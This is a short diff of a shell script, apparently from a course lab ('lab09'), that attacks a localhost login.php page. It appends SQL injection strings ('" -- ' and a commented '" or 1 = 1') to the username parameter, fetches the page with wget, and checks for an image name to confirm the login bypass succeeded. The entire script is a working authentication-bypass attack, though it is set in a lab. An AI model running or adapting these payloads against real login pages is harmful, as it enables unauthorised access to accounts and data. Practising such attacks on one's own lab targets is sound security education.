@@ -2,6 +2,7 @@
 
 address="http://localhost/lab09/login.php?u="
 address+=$1
+#address = 
 #address+="\" or 1 = 1"
 address+="\" -- "
 #address+="&p="
@@ -9,7 +10,9 @@ address+="\" -- "
 #address+=" "
 #wget -O index.html "`  echo $address ` "
 
-wget  -q -O -  "`  echo $address ` " 
+if ./wget  -q -O -  "`  echo $address ` " | grep -q 'cat.JPG'; then
+	echo 'yeaaaaaah'
+fi	
 echo
 
 #cat index.html
